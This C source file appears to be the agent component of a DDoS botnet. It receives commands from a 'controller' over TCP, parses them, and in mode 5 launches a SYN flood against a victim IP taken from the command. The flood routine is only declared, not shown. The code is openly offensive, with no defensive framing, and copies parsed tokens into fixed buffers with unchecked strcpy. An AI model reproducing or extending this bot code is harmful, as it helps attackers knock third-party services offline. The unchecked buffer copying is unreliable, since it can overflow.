#include <stdio.h>      /* for printf() and fprintf() */
#include <sys/socket.h> /* for recv() and send() */
#include <unistd.h>     /* for close() */
#include <string.h>
#include <stdlib.h>
#define RCVBUFSIZE 32   /* Size of receive buffer */

void DieWithError(char *errorMessage);  /* Error handling function */
int synFlood(char victimIP[32], int packet); /*synflood attack */

void parsing(char echoBuffer[RCVBUFSIZE], char parse[3][20])
{
    int i = 0;
    char *token = strtok(echoBuffer, ":");
    /* Tokenize commands */     
    while(token != NULL) {

        strcpy(parse[i], token);
        token = strtok(NULL, ":");
        i++;
    } 
}


void HandleTCPClient(int clntSocket)
{
    char echoBuffer[RCVBUFSIZE];        /* Buffer for echo string */
    int recvMsgSize;                    /* Size of received message */
    memset(echoBuffer,0,RCVBUFSIZE);
    /* Receive message from client */
    if ((recvMsgSize = recv(clntSocket, echoBuffer, RCVBUFSIZE, 0)) < 0)
        DieWithError("Agent recv() failed");

    printf("the message is %s \n",echoBuffer);
    char parse[3][20];
    int sock; 
    int packet;
    //prase the buffer into 
    parsing(echoBuffer,parse);
    char message[RCVBUFSIZE];
    /* switch case to handle appropriate mode request from controller */
    int mode;
    mode = atoi(parse[0]);
    switch (mode) {
        case 5 :
            packet= atoi(parse[2]);
            if (packet==0) {
                packet=100;
            }
            close(clntSocket);
            printf("%d packets sent",synFlood(parse[1],packet));
            //sendMessage(clntSocket, message);
            break;
        default :
            printf("Invalid Mode of Operation\n" );
            break;
    }

    close(clntSocket);    /* Close client socket */
    
}
